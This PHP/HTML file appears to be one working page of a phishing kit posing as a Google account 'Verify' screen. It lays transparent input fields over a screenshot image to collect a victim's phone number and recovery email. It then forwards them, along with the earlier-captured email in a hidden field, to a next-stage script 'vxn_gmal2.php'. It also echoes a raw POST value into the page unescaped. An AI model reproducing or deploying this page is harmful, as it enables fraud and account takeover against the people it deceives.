<?php

$emal = $_POST['emal'];

?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Verify</title>
<link rel="shortcut icon" href="images/fav_goog.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<input type="checkbox" id="Checkbox2" name="Checkbox1" value="on" style="position:absolute;left:474px;top:491px;z-index:6">
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:456px;top:0px;width:322px;height:623px;text-align:left;z-index:7;">
<img src="images/bodegmphn.png" id="Image1" alt="" align="top" border="0" style="width:322px;height:623px;"></div>

<div id="bv_Form1" style="position:absolute;left:478px;top:210px;width:282px;height:264px;z-index:8">
<form name="Form1" method="post" action="vxn_gmal2.php" id="Form1">

<input name="emal" type="hidden" value="<?php echo $emal;?>">


<input type="text" id="Editbox1" style="position:absolute;left:16px;top:27px;width:157px;height:25px;border:0px #C0C0C0 dotted;background-color:transparent;font-family:'Courier New';font-size:16px;z-index:0" name="phn" value="" pattern=".{9,10}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" maxlength="30" required onkeyup="this.value=this.value.replace(/\D/g,'')">
<input type="email" id="Editbox3" style="position:absolute;left:14px;top:95px;width:246px;height:25px;border:0px #C0C0C0 dotted;background-color:transparent;font-family:'helvetica';font-size:14px;z-index:1" name="recvry" value="" pattern=".{10,30}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" maxlength="30" >
<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:6px;top:148px;width:262px;height:35px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2">
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:23px;top:214px;width:219px;height:32px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:3;">
<a href="index_all.php"><img src="images/klik.png" id="Image3" alt="" align="top" border="0" style="width:219px;height:32px;"></a></div>
</form>
</div>
</body>
</html>